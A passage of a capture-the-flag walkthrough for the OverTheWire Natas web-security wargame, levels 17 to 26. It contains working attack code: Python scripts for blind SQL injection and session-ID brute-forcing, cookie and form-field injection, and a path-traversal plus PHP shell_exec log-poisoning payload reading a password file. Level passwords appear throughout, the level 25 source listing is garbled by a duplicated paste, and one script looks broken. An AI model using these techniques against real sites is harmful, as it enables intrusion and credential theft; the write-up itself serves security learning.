The only difference between this syntax and the one of level 15 is the `--time-sec=1` switch.
If you are seeing this for the first time i suggest you to check my explanation of this entire command on level 15 :)

This will get the job done in about 15 minutes.
And here it is: 8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq

**Method 2**
You already know it, time for Python!
This time will be faster as we can save most of the code from the previous level and arrange some little things.
The query that we want to test is:
```sql
SELECT * from users where username="natas18" and password like binary '%a%' and sleep(5) #
```

```
natas18" and password like binary '%d%' and sleep(5) #
```

```python
#!/bin/python  
  
# import the libraries that we need  
import requests  
from requests.auth import HTTPBasicAuth  
  
# Save the login information in variables  
username = "natas17"  
password = "XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd"  
url = "http://natas17.natas.labs.overthewire.org/index.php?"  

# declare the username object for later use
req_object = {'username': ''}  
  
# Variables that will contain the possible chars and the final password  
chars_in_pswd = ''  
pswd = ''  
  
# login to natas17 challenge  
authentication = HTTPBasicAuth(username, password)  
print(requests.get(url, auth=authentication))  
  
# Saving all the possible chars in a variable for later use  
chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'  
  
# Loop to check the presence of each char  
for char in chars:  
    payload = {'username': 'natas18" and password LIKE BINARY "%' + char + '%" and sleep(3) #'}  
    req = requests.post(url, auth=authentication, data=payload)  
    if req.elapsed.seconds >= 3:  
        chars_in_pswd = chars_in_pswd + char  
  
# Print the chars that are contained in the final password  
print(chars_in_pswd)  
  
# Execute the brute-force attack  
for count in range(0, 32):  
    for char in chars_in_pswd:  
        brute_force_payload = {'natas18" and password LIKE BINARY "' + pswd + char + '%" and sleep(3) #'}  
        req_object['username'] = brute_force_payload  
        request = requests.post(url, auth=authentication, data=req_object)  
        if request.elapsed.seconds >= 3:  
            pswd += char  
            print(pswd)  
            break  
  
# Print the final password  
print("The password for the next level of natas is: ", pswd)
```

Also this method will take a bit of time, so take a little break and wait, when you will be back you'll be please with natas18 password: 8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq
<br/>

---

### Natas 18
Access the website with the link : http://natas18.natas.labs.overthewire.org .  <br>
Insert the credentials :  <br>
username : natas18  <br>
password : 8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq  <br>

Continuing with web-forms, in this level we have a login screen where we have to log as admin to receive the password for natas19.

Looking at the source code we can see that there is a variable called `PHPSESSID` and it can assume values up to 640.
Opening the dev tools we see that `PHPSESSID` is a cookie.

We can also understand that when we insert the right credentials, a new session will be created with an ID value between 0 and 640; if the ID correspond to the one of the admin we will be logged as admin and get our password.

Since we know the range of ID values, we can create a script that will try all the values for us and print the next level's credentials:
```python
#!/bin/python  
  
# import the libraries that we need  
import requests  
from requests.auth import HTTPBasicAuth  
  
# Save the login information in variables  
username = "natas18"  
password = "8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq"  
url = "http://natas18.natas.labs.overthewire.org/index.php?"  
  
# Login to natas18 challenge  
authentication = HTTPBasicAuth(username, password)  
print(requests.get(url, auth=authentication))  
  
# Brute forcing the ID and retrieve the password  
for i in range(118, 640):  
    print("testing number", i)  
    cookie = {"PHPSESSID": str(i)}  
    req = requests.post(url, auth=authentication, cookies=cookie)  
    if "You are an admin" in req.text:  
        print("the right ID is: ", i)  
        print(req.text)  
        break
        
```

And in a couple of minutes we have the password : 8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s
<br/>

---

### Natas 19
Access the website with the link : http://natas19.natas.labs.overthewire.org .  <br>
Insert the credentials :  <br>
username : natas19  <br>
password : 8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s <br>

When we log into the level we get a message saying "This page uses mostly the same code as the previous level, but session IDs are no longer sequential..." 
Another difference is the absence of the link to view the source code of the script behind the form.

In order to better understand the situation i have opened the Dev Tools and tried to login with random credentials, what happens is that a cookie called `PHPSESSID` get created and populated with a sequence of numbers and letters.

I have noticed that the sequence seems only composed by certain numbers and letters, to be more specific it looks like something encoded in hexadecimal.
I decoded it with an online tool and got this: 3336322d61646d696e --> 362-admin

This looks really more similar to what we have  just seen in level 18, knowing that the code is mostly the same it means that we have to find again the right number and than append `-admin`, and encode it in hexadecimal; We can than try a brute force attack by sending all those combinations as cookies like we did on last level.

```python
#!/bin/python  
  
# import the libraries that we need  
import requests  
from requests.auth import HTTPBasicAuth  
  
# Save the login information in variables  
username = "natas19"  
password = "8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s"  
url = "http://natas19.natas.labs.overthewire.org/index.php?"  
  
# Login to natas19 challenge  
authentication = HTTPBasicAuth(username, password)  
print(requests.get(url, auth=authentication))  
  
# Brute forcing the cookie and retrieve the password  
for i in range(0, 640):  
    print("testing number", i)  
    code = str(str(i) + "-admin")  
    print(code)  
    hexa_encoded = code.encode().hex()  
    print(hexa_encoded)  
    cookie = {"PHPSESSID": str(hexa_encoded)}  
    req = requests.post(url, auth=authentication, cookies=cookie)  
    if "You are an admin" in req.text:  
        print("the right ID is: ", i, "and the right cookie is: ", cookie)  
        print(req.text)  
        break
        
```

This time will take a bit longer as the ID is set to an higher value, but after some patience we get our password: guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH
The right combination was : 281-admin --> 3238312d61646d696e
<br/>

---
### Natas 20
Access the website with the link : http://natas20.natas.labs.overthewire.org .  <br>
Insert the credentials :  <br>
username : natas20  <br>
password : guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH <br>

Once we log into the level we can see again another webform, but this time we are given a warning message telling us:
"*session_start(): Failed to read session data: user (path: /var/lib/php/sessions) in **/var/www/natas/natas20/index.php** on line **106***  
*You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.*"

We can start analyzing the source code to better understand what is happening inside the PHP code and why a warning is given.
The PHP script is taking care about the session handling, it check if we are logged in as admin it will print us the credentials for level 21 or display a message if we are logged as normal users.

More specifically the `print_credentials()` function checks if the user is admin or not by checking the `admin` key in the `$_SESSION` array.

The vulnerable part of the code is the `mywrite()` function, in fact we can see that there debugs info can be seen and they contain the credentials. Also data is stored line by line, we can notice the new line symbol at the end.

Knowing this we can think about abusing the debug logs to print the credentials, but first we want to inject the "admin" keyword to make happy the function that checks for it inside the `$_SESSION` variable, also its value has to be 1.

To gain more info we can use Burp Suite proxy to capture the request, for the first time we can put any word in the form, once you have the capture send it to repeater.
Here we can play around and quickly modify the request and see the response.

In order to receive the debug messages we have to append `?debug` at the end of the  URL (line 1 in Burp request, after `index.html`). 

We have to inject this string: `\nadmin 1`, but since it only accepts URL encoded input we need to convert it -->`%0Aadmin%201`.
Note that if you just paste the string inside an online converter it will output a different encoded string as it view `\n` as characters while we are using it as the new line sign -> `%0A` 

Now just hit send, and in the HTTP response we get the password: 89OWrTkGmiLZLv12JY4tLj2c4FW0xn56
<br/>

---
### Natas 21
Access the website with the link : http://natas21.natas.labs.overthewire.org .  <br>
Insert the credentials :  <br>
username : natas21  <br>
password : 89OWrTkGmiLZLv12JY4tLj2c4FW0xn56 <br>

After logging into the level i see a message saying that: "this website is co-located with [http://natas21-experimenter.natas.labs.overthewire.org](http://natas21-experimenter.natas.labs.overthewire.org/)", click on the link and another webpage appears.
In this new page there is a a little css experiment, we can change some values to change the look of the line with the "Hello world!" in it.

We can go and check the source code, again a PHP script, this time it takes care of the "little css experiment".
Looks like we can use again the  `?debug` at the end to have debug information after we try to submit some changes.

We can also look at the first page we landed on when we have opened the challenge, here the source code show us that there is the same function to check and display the credentials as last level, containing this if statement:
```php
if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)
```

Since the 2 sites are connected by idea is that we have to inject the same values as last time, but using the second site for that, than reloading the page on the first site should get us done.

Now we have to find out how exactly we can inject "admin" and set its value to "1" in the css example.

**Method 1**
Time to Burp Suite again, so capture both the request of the first and the affiliated pages, send them both to repeater.
In the request modify the URL `index.php?debug` in order to see the debug info and know if our attempts are succesful.

Now we can try to inject the wanted pair "admin=1" in the form but this will only set it as a value of other fields, we either need to escape it or try if adding another field is permitted.
Luckily enough there are not proper controls and we can just add a new filed as we like and we can also set its value.
We can do it this way:
```
align=center&fontsize=100&%25bgcolor=yellow&admin=1&submit=Update
```

Now admin value is set to 1 and stored in `$_SESSION`, we know the other site read whats inside of it and check for the match, in order to allow it we also have to use the same `PHPSESSID`, so copy the cookie value from the successful request (the one of page 2) and substitute it into the request of page 1.

Now just press send and here we have it: 91awVM9oDiUGm33JdzM7RVLBS8bz9n0s

**Method2**
Another way to reach the same result but only using your browser is by:
- inspecting the css experiment form, add another element called "admin" and set its value to 1
- `<input name="admin" value="1">`
- then you can submit it, open the dev tools and copy the cookie,
- now go on the first page of the challenge, and edit the cookie value with the one you have just copied,
- reload the page and get natas22 credentials 
<br/>

---
### Natas 22
Access the website with the link : http://natas22.natas.labs.overthewire.org . 
Insert the credentials : 
username : natas22
password : 91awVM9oDiUGm33JdzM7RVLBS8bz9n0s

This time, after logging in, we can see only an empty page with the link to view the source code, let's inspect it.
There are 2 PHP bloks:
```php
<?php
session_start();

if(array_key_exists("revelio", $_GET)) {
    // only admins can reveal the password
    if(!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) {
    header("Location: /");
    }
}
?>
```

and 
```php
<?php
    if(array_key_exists("revelio", $_GET)) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas23\n";
    print "Password: <censored></pre>";
    }
?>
```

Similarly to the previous levels, the code is checking for some keys inside an array ("revelio"),  if there is a match with the right value some actions will be performed.
There is another thing tho, if the admin key and its value are not in the array it will redirect us to the main page.

We can continue by capturing the request of the page with Burp Suite and send it to repeater.
Here we need to modify it request URL to include the magic word "revelio":

In the first line add: `/index.php?revelio`, then press send  and here we have the password: qjA8cOoKFTzJhtV0Fzvt92fgvxVnVRBj.
<br/>

---
### Natas 23
Access the website with the link : http://natas23.natas.labs.overthewire.org . 
Insert the credentials : 
Username: natas23
Password: qjA8cOoKFTzJhtV0Fzvt92fgvxVnVRBj

Keep going with web-forms this time we have to provide a password and than press the login button.

Let's review the source code, there is a PHP block:
```php
<?php
    if(array_key_exists("passwd",$_REQUEST)){
        if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10 )){
            echo "<br>The credentials for the next level are:<br>";
            echo "<pre>Username: natas24 Password: <censored></pre>";
        }
        else{
            echo "<br>Wrong!<br>";
        }
    }
    // morla / 10111
?>  
```

The code here checks for the presence of the "passwd" key, then it is using the  `strstr()` function that searches for the first occurrence of a string inside another string and the length has to be over 10, but it will also return true for any value that we insert higher than the number 10 (es. 11).

Now we can continue by capturing the submission request of the password (just write a random string), with Burp Suite and send it to repeater.
In the first line you will see `GET /?passwd=teststring`.

As we know how the `strstr()` function work and that we have to insert a number higher than 10 we can craft an URL like this
```
GET /?passwd=11iloveyou
```

So the `strstr()` function will take the value before the "iloveyou" string, and confront it with the second part of the if statement, 11 is > than 10, the if clause returns true and we get the password: 0xzF30T9Av8lgXhW7slhFCIsVKAPyl2r
<br/>

---
### Natas 24
Access the website with the link : http://natas24.natas.labs.overthewire.org . 
Insert the credentials : 
Username: natas24
Password: 0xzF30T9Av8lgXhW7slhFCIsVKAPyl2r

After accessing we have the same screen as in level 23, a web-form to submit the password, let's take a look at the source code:
```php
<?php    
	if(array_key_exists("passwd",$_REQUEST)){  
        if(!strcmp($_REQUEST["passwd"],"<censored>")){  
            echo "<br>The credentials for the next level are:<br>";  
            echo "<pre>Username: natas25 Password: <censored></pre>";  
        }  
        else{  
            echo "<br>Wrong!<br>";  
        }  
    }    
    // morla / 10111  
?>
```

The code-block is also very similar to the one we have just seen in the previous level, but this time in the if statement there is a new function.
The `strcmp()` function has the job to compare 2 strings, if they are equal it will return `0`, if string1 is less than string 2 will return a value `<0` and if string1 is greater than string2 will return a value `>0`.

There is another thing to notice: the function is preceded by an exclamation mark (`!`), which means that it flips the Boolean value.

Searching on the internet i have found that that function has a known vulnerability, when comparing with a `Null` value that will cause to pass the comparison.
In our scenario the way to do it is by setting an empty array ("passwd").

To manipulate it we can either use Burp Suite or simply modify the URL in the browser, after clicking on Login to spawn the full URL:
```http
http://natas24.natas.labs.overthewire.org/?passwd[]=
```

This will cause an error and pass the comparison, spitting out our password: O9QD9DZBDq1YpswiTM5oqMDaOtuZtAcx
<br/>

---
### Natas 25
Access the website with the link : http://natas25.natas.labs.overthewire.org . 
Insert the credentials : 
Username: natas25
Password: O9QD9DZBDq1YpswiTM5oqMDaOtuZtAcx

Accessing the challenge we can see a long quote about the matter, atoms and the existence of God, beside that on the top right there is the chance to change the language of the text.

Time to get more information from the source code, here the PHP script is taking care about the change language function and is trying to put some controls in order to stop known attacks like directory traversal or accessing specific files like the one containing the password.
Later on it will also collect the requests' logs and save them in `/var/www/natas/natas25/logs/natas25_SESSION-ID.log`.

```php
<?php
    // cheers and <3 to malvina
    // - morla

    function setLanguage(){
        /* language setup */
        if(array_key_exists("lang",$_REQUEST))
            if(safeinclude("language/" . $_REQUEST["lang"] ))
                return 1;
        safeinclude("language/en"); 
    }
    
    function safeinclude($filename){
        // check for directory traversal
        if(strstr($filename,"../")){
            logRequest("Directory traversal attempt! fixing request.");
            $filename=str_replace("../","",$filename);
        }
        // dont let ppl steal our passwords
        if(strstr($filename,"natas_webpass")){
            logRequest("Illegal file access detected! Aborting!");
            exit(-1);
        }
        // add more checks...

        if (file_exists($filename)) { 
            include($filename);
            return 1;
        }
        return 0;<?php
    // cheers and <3 to malvina
    // - morla

    function setLanguage(){
        /* language setup */
        if(array_key_exists("lang",$_REQUEST))
            if(safeinclude("language/" . $_REQUEST["lang"] ))
                return 1;
        safeinclude("language/en"); 
    }
    
    function safeinclude($filename){
        // check for directory traversal
        if(strstr($filename,"../")){
            logRequest("Directory traversal attempt! fixing request.");
            $filename=str_replace("../","",$filename);
        }
        // dont let ppl steal our passwords
        if(strstr($filename,"natas_webpass")){
            logRequest("Illegal file access detected! Aborting!");
            exit(-1);
        }
        // add more checks...

        if (file_exists($filename)) { 
            include($filename);
            return 1;
        }
        return 0;
    }
    
    function listFiles($path){
        $listoffiles=array();
        if ($handle = opendir($path))
            while (false !== ($file = readdir($handle)))
                if ($file != "." && $file != "..")
                    $listoffiles[]=$file;
        
        closedir($handle);
        return $listoffiles;
    } 
    
    function logRequest($message){
        $log="[". date("d.m.Y H::i:s",time()) ."]";
        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
        $log=$log . " \"" . $message ."\"\n"; 
        $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
        fwrite($fd,$log);
        fclose($fd);
    }
?>
    }
    
    function listFiles($path){
        $listoffiles=array();
        if ($handle = opendir($path))
            while (false !== ($file = readdir($handle)))
                if ($file != "." && $file != "..")
                    $listoffiles[]=$file;
        
        closedir($handle);
        return $listoffiles;
    } 
    
    function logRequest($message){
        $log="[". date("d.m.Y H::i:s",time()) ."]";
        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
        $log=$log . " \"" . $message ."\"\n"; 
        $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
        fwrite($fd,$log);
        fclose($fd);
    }
?>
```


My idea is to find a way to bypass the directory traversal, as it only check for `../` chars, this way we can access the file containing the password stored in `/etc/natas_webpass/natas26`.
By doing so we won't get the password yet, that's because another check is made and it blocks and logs if we enter "web_pass".
This is actually good for us as the content of the file will be saved in the logs and later we can find a way to access the log file and read the password.

Let's begin:
1. Find a bypass for directory traversal: 
	Since here it checks only against a specific `../` we can use another common one: `....//`

2.Get to the root:
	Now we have to check where we are inside the machine and find our way into the root `/`, to do it start putting `..../` in the URL and check the error messages, after a couple of tries you will see the first warning saying that we are at `/`.
```http
http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//....//
```

3. Bypass the string filter:
	I have tried encoding the "natas_webpass" part but didn't work.
	Checking again the source code i have noticed that in the logs is saved also the user-agent, luckily for us it is saved in the super global variable `$_SERVER`. The good new is that it can also store the result of a command, so we can pass the cat command to it that will display the password and later save it into the logs.

	In Burp Suite we can delete the old value of the user-agent header and insert this PHP payload
```php
<?php echo shell_exec("cat /etc/natas_webpass/natas26"); ?>
```

Now the password is saved also in the logs!

The success of this payload tells us that can run some other commands as well (like whoami, view the /etc/passwd), just put them inside the argument of `shell_exec("")` .

4. Check the logs:
	In order to construct the right path for the log file we firstly need to open dev tools or check in the Burp Suite request the value of PHPSESSID cookie, one we have it we can add it into the final path for the file and ultimate the URL.
```http
http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//....//var/www/natas/natas25/logs/natas25_kvheegd4dttljt9eh52k7j8ma8.log
```

And here it is: 8A506rfIAXbKKk68yJeuTuRq4UfcK70k
<br/>

---
### Natas 26
Access the website with the link : http://natas26.natas.labs.overthewire.org <br>
Insert the credentials: <br> 
Username: natas26 <br>
Password: 8A506rfIAXbKKk68yJeuTuRq4UfcK70k <br>

<br/>

---
**To Be Continued...**

